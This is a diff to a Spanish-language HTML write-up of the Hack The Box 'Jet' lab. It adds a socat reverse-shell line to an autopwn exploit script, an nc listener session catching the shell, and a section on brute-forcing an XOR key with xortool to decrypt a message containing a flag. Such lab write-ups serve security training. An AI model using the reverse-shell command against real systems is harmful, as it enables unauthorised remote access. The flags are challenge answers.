@@ -544,7 +544,8 @@ JET{0v3rfL0w_f0r_73h_lulz}
     
     shell.recvuntil(b"> ")
     shell.sendline(payload)
-    shell.interactive()
+    shell.sendline(b"export HOME=/home/alex")
+    shell.sendline(b"socat TCP:10.10.14.15:4444 EXEC:'/bin/bash -p',pty,stderr,setsid,sigint,sane")
 
 <span class="a-purple">if</span> __name__ == <span class="a-green">"__main__"</span>:
     expose = threading.Thread(target=LeakExpose)
@@ -555,12 +556,87 @@ JET{0v3rfL0w_f0r_73h_lulz}
     pwn.start()
     <span class="a-red">pass</span>
 </pre>
+
+<p>Mientras el autopwn ejecuta, levantamos nc para obtener una shell mas interactiva</p>
+<pre class="pre-code">
+<a class="command">❯ nc </a>-nlvp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.13.37.10 54374
+bash-4.3$ whoami
+whoami
+alex
+bash-4.3$ 
+</pre>
                          <!-- END AUTOPWN-->
 
                          <!-- Start Seventh Flag-->
-                         <h3 style="color: #dacece;">Flag 7: </h3>
-                         <p>Estoy trabajando en ello</p>
-                         <!-- Start Seventh Flag-->
+                         <h3 style="color: #dacece;">Flag 7: Secret Message</h3>
+                         <p>Para esta flag, seguimos dentro del usuario Alex, listando su directorio tenemos los siguientes archivos, mismos que llevaré a mi máquina atacante:</p>
+                         <pre class="pre-code">bash-4.3$ ls
+crypter.py  encrypted.txt  exploitme.zip  flag.txt  xor.py.save
+bash-4.3$</pre>
+                         <p>Entendiendo el script de <a class="code">crypter.py</a> sabemos que se basa en una encriptación de XOR bit a bit ayudado bajo la libreria de binascii.
+                         <br>En principio usé la herramienta <a class="toolref" href="https://pypi.org/project/xortool/">xortool</a> que nos ayudara en la proporción de la longitud de la contraseña utilizada para la encriptación.</p>
+                         <pre class="pre-code">
+<a class="command">❯ xortool</a> encrypted.txt
+The most probable key lengths:
+ 1:  13.3%
+ 4:  13.8%
+ 8:  11.4%
+12:  10.0%
+14:   8.7%
+<span style="background-color: coral; color: #f0f0f0;">17:  15.7%</span>
+20:   7.3%
+24:   6.1%
+28:   5.5%
+34:   8.3%
+Key-length can be 4*n
+Most possible char is needed to guess the key!</pre>
+                         <p>Con la longitud mas aproximada [17] realizaremos una prueba de fuerza bruta para obtener la contraseña.</p>
+                         <pre class="pre-code">
+<a class="command">❯ xortool</a> encrypted.txt -l 17 -b
+4608 possible key(s) of length 17:
+SECXREZEBIN\x06ROCF^
+SECXREZEBIN\x06RBCF^
+SECXREZEBIN\x02ROCF^
+SECXREZEBIN\x02RBCF^
+SECXREZEBINNROCF^
+...
+Found 958 plaintexts with 95%+ valid characters
+See files filename-key.csv, filename-char_used-perc_valid.csv</pre>
+                         
+                         <p>Aunque encontramos un aproximado no logramos obtener la clave completa, de aqui realizaremos unas pruebas en la herramienta de <a class="toolref" href="https://cyberchef.org/">cyberchef</a>.
+                         <br>Comenzaremos las pruebas con la posibilidad encontrada previamente <span class="code">SECXREZEBINNROCF^</span></p>
+                         <span>
+                              <img src="../images/HTB/Jet/cyberchef.png"/>
+                         </span>
+                         
+                         <p><br>Después de algunas pruebas dimos con la clave <span class="code">securewebincrocks</span>.</p>
+                         <span>
+                              <img src="../images/HTB/Jet/cyberchef_decrypted.png"/>
+                         </span>
+                         <p><br>Y el texto contenido, incluye la flag <a class="code">JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}</a></p>
+                         <pre class="pre-code">Hello mate!
+
+First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!
+
+Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip. The password is the same we use to encrypt our communications.
+Make sure those binaries are kept safe!
+
+To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.
+
+The ports are 5555 and 7777.
+Have fun and keep it safe!
+
+JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}
+
+
+Cheers - Alex
+
+-----------------------------------------------------------------------------
+This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.
+-----------------------------------------------------------------------------</pre>
+                         <!-- End Seventh Flag-->
 
                          <!-- Start Eighth Flag-->
                          <h3 style="color: #dacece;">Flag 8: </h3>
@@ -568,7 +644,7 @@ JET{0v3rfL0w_f0r_73h_lulz}
                          <!-- End Seventh Flag-->
 
                          <!-- Start Ninth Flag-->
-                         <h3 style="color: #dacece;">Flag 7: </h3>
+                         <h3 style="color: #dacece;">Flag ?: </h3>
                          <p>Estoy trabajando en ello</p>
                          <!-- End Ninth Flag-->
 
